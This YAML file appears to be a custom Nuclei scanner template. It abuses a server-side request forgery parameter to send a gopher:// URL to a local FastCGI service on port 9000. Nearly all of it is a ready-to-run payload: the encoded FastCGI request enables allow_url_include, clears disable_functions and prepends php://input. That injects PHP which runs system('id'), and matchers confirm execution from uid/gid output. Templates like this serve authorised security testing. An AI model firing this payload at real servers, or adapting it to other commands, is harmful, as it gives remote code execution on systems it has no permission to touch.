id: gopher-fastcgi-rce
info:
  name: FastCGI SSRF to RCE via Gopher
  author: jakelo-ai
  severity: critical
  description: Exploit SSRF to execute commands via local FastCGI (port 9000). Pre-calculated payload executes 'id'.
  tags: ssrf,gopher,fastcgi,rce,custom

http:
  - method: GET
    path:
      - "{{BaseURL}}/?url=gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20%2F%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A%2F%2Finput%0F%17SCRIPT_FILENAME%2Fusr%2Fshare%2Fphp%2FPEAR.php%0D%01DOCUMENT_ROOT%2F%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00T%04%00%3C%3Fphp%20system%28%27id%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00"
    
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "uid=[0-9]+.*gid=[0-9]+.*"
      - type: word
        words:
          - "Made-by-SpyD3r"
